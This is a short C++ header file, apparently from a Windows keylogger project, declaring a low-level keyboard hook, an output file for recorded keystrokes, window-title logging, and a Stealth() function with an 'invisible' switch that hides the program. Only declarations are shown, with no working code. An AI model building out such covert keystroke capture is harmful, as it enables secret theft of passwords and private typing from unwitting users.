#pragma once
#ifndef key2_h
#define key2_h

#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>


#define invisible // (visible / invisible)


extern HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
extern KBDLLHOOKSTRUCT kbdStruct;

extern std::ofstream OUTPUT_FILE;

extern char lastwindow[256];
void SalvarTempo(char *window_title);



int Save(int key_stroke);
int rodarKey();
void Stealth();

#endif